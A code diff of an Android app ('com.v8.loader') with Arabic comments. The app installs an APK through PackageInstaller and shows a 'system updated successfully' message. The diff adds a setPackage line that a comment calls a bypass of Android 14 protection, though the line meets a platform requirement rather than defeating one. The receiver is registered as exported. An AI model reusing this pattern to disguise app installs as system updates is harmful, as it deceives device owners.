@@ -19,7 +19,7 @@ public class MainActivity extends AppCompatActivity {
 
     private static final String ACTION_INSTALL_COMPLETE = "com.v8.loader.INSTALL_COMPLETE";
 
-    // المستمع اللي يلقف رسالة النظام ويفتح نافذة التثبيت
+    // المستمع اللي يلقف رسالة النظام ويفتح نافذة التثبيت للمستخدم
     private final BroadcastReceiver installReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -30,7 +30,7 @@ public class MainActivity extends AppCompatActivity {
                 if (status == PackageInstaller.STATUS_SUCCESS) {
                     Toast.makeText(context, "تم تحديث النظام بنجاح! ✅", Toast.LENGTH_LONG).show();
                 } else if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
-                    // تم تصحيح الخطأ هنا: استخدمنا Intent.EXTRA_INTENT
+                    // فتح نافذة التأكيد للمستخدم
                     Intent confirmationIntent = (Intent) intent.getParcelableExtra(Intent.EXTRA_INTENT);
                     if (confirmationIntent != null) {
                         confirmationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -48,6 +48,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        // تسجيل المستمع في النظام مع دعم إصدارات أندرويد الحديثة
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE), Context.RECEIVER_EXPORTED);
         } else {
@@ -98,7 +99,10 @@ public class MainActivity extends AppCompatActivity {
             out.close();
 
             Intent intent = new Intent(ACTION_INSTALL_COMPLETE);
-            // استخدمنا FLAG_MUTABLE لضمان التوافق مع أندرويد 12 فما فوق
+            
+            // 🔥 السطر السحري الجديد لتخطي حماية أندرويد 14 🔥
+            intent.setPackage(context.getPackageName()); 
+
             PendingIntent pendingIntent = PendingIntent.getBroadcast(
                     context, 
                     sessionId, 
